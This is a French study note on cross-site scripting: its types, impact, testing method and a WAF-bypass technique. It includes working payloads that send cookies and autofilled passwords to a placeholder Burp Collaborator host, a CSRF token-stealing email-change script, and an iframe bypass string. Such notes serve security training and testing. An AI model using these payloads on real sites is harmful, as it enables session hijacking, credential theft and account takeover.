---
title: "12.XSS"
category: "Client"
tag: "Web"
---

## CheckList en pratique


## Explication de la vulnérabilité  
XSS est une vulnérabilité qui permet à un attaquant de compromettre les interactions des utilisateurs avec une application vulnérable.

Cela permet à un attaquant de contourner lE **SAME ORIGIN POLICY**, conçue pour séparer les différents sites Web les uns des autres. Les xss permettent normalement à un attaquant de se faire passer pour un utilisateur victime, d'effectuer toutes les actions que l'utilisateur est capable d'effectuer et d'accéder à ses données.

Si l'utilisateur victime dispose d'un accès privilégié à l'application, l'attaquant pourrait alors être en mesure d'obtenir un contrôle total sur toutes les fonctionnalités et données de l'application.

Les xss fonctionnent en manipulant un site vulnérable afin qu'il renvoie du js malveillant aux utilisateurs. Lorsque le code malveillant s'exécute dans le navigateur d'une victime, l'attaquant peut totalement compromettre son interaction avec l'application.

## Les différentes catégories de XSS

- `XSS réfléchie`, où le script malveillant provient de la requête HTTP actuelle.
- `XSS stockée`, où le script malveillant provient de la base de données du site Web.
- `XSS basée sur DOM`, où la vulnérabilité existe dans le code côté client plutôt que dans le code côté serveur.

## XSS Réfléchie

`XSS Réfléchie` est la variété la plus simple des XSS. Cela se produit lorsqu'une application reçoit des données dans une requête HTTP et inclut ces données dans la réponse immédiate de manière dangereuse.

```html
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
<p>Status: <script>alert(1)</script></p>
```

Si l'utilisateur visite l'URL construite par l'attaquant, le script de l'attaquant s'exécute dans le navigateur de l'utilisateur, dans le contexte de la session de cet utilisateur avec l'application.  
À ce stade, le script peut effectuer n'importe quelle action et récupérer toutes les données auxquelles l'utilisateur a accès.

### Impacts des XSS réfléchies

Si un attaquant peut contrôler un script exécuté dans le navigateur de la victime, il peut généralement compromettre entièrement cet utilisateur. L’attaquant peut entre autres :

- Effectuez toute action dans l'application que l'utilisateur peut effectuer.
- Afficher toutes les informations que l'utilisateur peut consulter.
- Modifiez toute information que l'utilisateur est en mesure de modifier.
- Initiez des interactions avec d’autres utilisateurs de l’application, y compris des attaques malveillantes, qui sembleront provenir de l’utilisateur victime initial.

Différents moyens par lesquels un attaquant peut inciter une victime à faire une demande qu'il contrôle :
- Placer un lien sur un site web contrôlé par l'attaquant
- Même chose sur un autre site où il peut généré du contenu
- envoyer un lien dans un mail
- Tweet

## Exploitation des vulnérabilités des scripts intersites

Pour les POC, utiliser `alert(document.domain)` pour prouver que le JS est exécuté sur le domaine courant.
Pour montrer à quel point la XSS est sévère, il peut être bon de savoir comment l'exploiter au delà de ça.

### Exploiter les scripts intersites pour voler des cookies
On peut exploiter les vulnérabilités de XSS pour envoyer les cookies de la victime vers notre propre domaine, puis injecter manuellement les cookies dans le navigateur et usurper l'identité de la victime.

En pratique, cette approche présente quelques limites importantes :

- La victime n'est peut-être pas connectée.
- De nombreuses applications masquent leurs cookies à JavaScript à l'aide de l'indicateur `HttpOnly`.
- Les sessions peuvent être verrouillées sur des facteurs supplémentaires tels que l'adresse IP de l'utilisateur.
- La session peut expirer avant que vous puissiez la détourner.

```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
**Penser à utiliser RequestBin/pipedream** en attendant d'avoir la version pro de burp pour le http listener.

## Exploiter les scripts intersites pour capturer les mots de passe

De nos jours, de nombreux utilisateurs disposent de gestionnaires de mots de passe qui remplissent automatiquement leurs mots de passe. 

On peut en profiter en créant une saisie de mot de passe, en lisant le mot de passe rempli automatiquement et en l'envoyant à notre propre domaine.

Cette technique évite la plupart des problèmes liés au vol de cookies et peut même accéder à tous les autres comptes où la victime a réutilisé le même mot de passe.

```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

Chercher d'autres payloads pour ça.

## Exploiter les scripts intersites pour exécuter CSRF
Tout ce qu'un utilisateur légitime peut faire sur un site Web, peut être reproduit avec du XSS.
Les actions sont diverses, comme par exemple obliger une victime à  :
- envoyer un message
- accepter une demande d'ami
- commit une backdoor dans un repository
- transférer du Bitcoin ...

Certains sites Web permettent aux utilisateurs connectés de modifier leur adresse e-mail sans ressaisir leur mot de passe.

Si on trouve une XSS, On peut faire déclencher cette fonctionnalité pour remplacer l'adresse e-mail de la victime par une à notre disposition, puis déclencher une réinitialisation du mot de passe pour accéder au compte.

Cette vulnérabilité est le CSRF.

Une attaque CSRF peut se suffire à elle même (sans XSS). 
On peut s'en prémunis à l'aide de stratégies telles que les jetons anti-CSRF. Cependant, ces stratégies n'offrent aucune protection si une vulnérabilité XSS est également présente.

Exemple de payload pour un XSS stockée pour provoquer un CSRF sur le changement de mail :
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

## Comment trouver et tester les vulnérabilités XSS

On peut utiliser le scanner de vulnérabilités web BURP.

Recherche manuelle pour les `XSS Réfléchies et Stockées`:
- repérer tous les points d'entrée de l'application
- Soumettre une entrée simple unique dans un point d'entrée.
- Identifier l'emplacement dans la réponse où apparaissent les données contrôlables par l'attaquant.
- identifier toute validation d'entrée ou autre traitement effectué sur ces données par l'application.
- Tester individuellement chaque entrée pour vérifier si du code JS peut s'exécuter.


Recherche manuelle pour les `XSS DOM based`:
- même méthodologie, identifiant unique pour repérer.
- Utiliser les outils de développement du navigateur pour rechercher l'entrée dans le DOM.


Pour de la recherche de DOM-based vulnérabilités, voir autres notes.
On va voir dans le contexte plus de spécificités pour de la recherche de XSS réfléchie et stockées.

# Contextes d'XSS (Refléchie et Stockées)

## XSS entre des balises HTML (<ba>myXSS</ba>)

Paylaod  conçu pour trigger l'exécution JS dans un tag html:

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
<img src=1 onerror=print()>
<body onload=print()>
```

### Technique pour bypass un WAF
Imaginons une entrée utilisateur (barre de recherche), avec une entrée utilisateurs qui finit dans la queryString.
On veut trouver les balises et attributs qui ne sont pas bloqués avec burp intruder.
Pour la balise:
- &rarr; BurpIntruder &rarr; `GET /?search=<$$>`
- [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) &rarr; `Copy tags to clipboard` &rarr; `Start Attack`
- Trier par code de retour pour avoir un 200 (et pas de 4xx).
- Imaginons que `body` fonctionne, faire de même pour `l'attribut`
- [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) &rarr; `copy events to clipboard` &rarr; `Start Attack`
- Puis l'XSS peut ressembler à `<iframe src="https://insecureWebsite/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
